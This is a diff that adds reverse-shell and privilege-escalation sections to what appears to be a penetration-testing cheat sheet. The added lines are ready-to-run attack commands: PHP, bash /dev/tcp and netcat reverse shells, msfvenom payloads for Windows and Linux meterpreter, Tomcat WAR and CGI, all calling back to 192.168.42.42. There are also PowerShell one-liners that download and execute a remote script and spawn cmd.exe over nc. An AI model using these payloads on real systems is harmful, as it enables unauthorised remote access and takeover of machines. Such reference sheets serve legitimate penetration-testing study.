@@ -223,3 +223,62 @@ Later on is possible to connect from the local machine:
 ~~~
 ssh foo@192.168.25.74
 ~~~
+##### Reverse shells
+###### php
+~~~
+<?php $sock = fsockopen("192.168.42.42","443"); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
+~~~
+~~~
+php -r '$sock=fsockopen("192.168.42.42",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+~~~
+###### bash
+~~~
+bash -i >& /dev/tcp/192.168.42.42/443 0>&1
+~~~
+###### sh + nc
+~~~
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.42.42 443 >/tmp/f
+~~~
+###### Perl (example deploy as cgi-bin)
+~~~
+msfvenom -p cmd/unix/reverse_perl LHOST="192.168.42.42" LPORT=443 -f raw -o reverse_shell.cgi
+~~~
+###### Java (example to deploy on tomcat)
+~~~
+msfvenom -p java/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f war  rev_shell.war
+~~~
+###### Windows HTPP download reverse shell
+~~~
+msfvenom -a x86 --platform windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://192.168.42.42/Invoke-PowerShellTcp.ps1')\"" -e x86/unicode_mixed BufferRegister=EAX -f python
+~~~
+###### Windows staged reverse TCP
+~~~
+ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
+ ~~~
+###### Windows stageless reverse TCP
+~~~
+msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.42.42 LPORT=443 -f exe -o <output_name.format>
+~~~
+###### Linux staged reverse TCP
+~~~
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o <outout_name>.elf
+~~~
+###### Linux staged reverse TCP
+~~~
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o <outout_name>.elf
+~~~
+
+##### Privilege escalation
+###### Windows
+###### Run-As
+~~~
+PS C:\> $secstr = New-Object -TypeName System.Security.SecureString
+PS C:\> $username = "<domain>\<user>"
+PS C:\> $password = '<password>'
+PS C:\> $secstr = New-Object -TypeName System.Security.SecureString
+PS C:\> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+PS C:\> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
+PS C:\> Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<ip/host>:<port>/path/to/file.evil') } -Credential $cred -Computer localhost
+-----------------------------------------------------------------------------------------------------
+Invoke-Command -ComputerName localhost -Creadential $credential -ScriptBlock { C:\inetpub\wwwroot\internal-01\log\nc.exe 10.10.14.4 1338 -e cmd.exe }
+~~~
